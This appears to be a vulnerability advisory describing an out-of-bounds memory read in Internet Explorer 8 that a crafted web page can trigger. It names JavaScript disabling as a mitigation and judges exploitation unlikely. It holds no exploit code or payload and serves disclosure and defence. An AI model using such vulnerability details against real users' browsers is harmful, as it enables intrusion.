Synopsis

A specially crafted web-page can cause Microsoft Internet Explorer 8 to attempt to read data beyond the boundaries of a memory allocation. The issue does not appear to be easily exploitable.

Known affected software, attack vectors and mitigations

Microsoft Internet Explorer 8

An attacker would need to get a target user to open a specially crafted web-page. Disabling Javascript should prevent an attacker from triggering the vulnerable code path.

Description

The issue requires rather complex manipulation of the DOM and results in reading a value immediately following an object. The lower three bits of this value are returned by the function doing the reading, resulting in a return value in the range 0-7. After exhaustively skipping over the read AV and having that function return each value, no other side effects were noticed. For that reason I assume this issue is hard if not impossible to exploit and did not investigate further. It is still possible that there may be subtle effects that I did not notice that allow exploitation in some form or other.
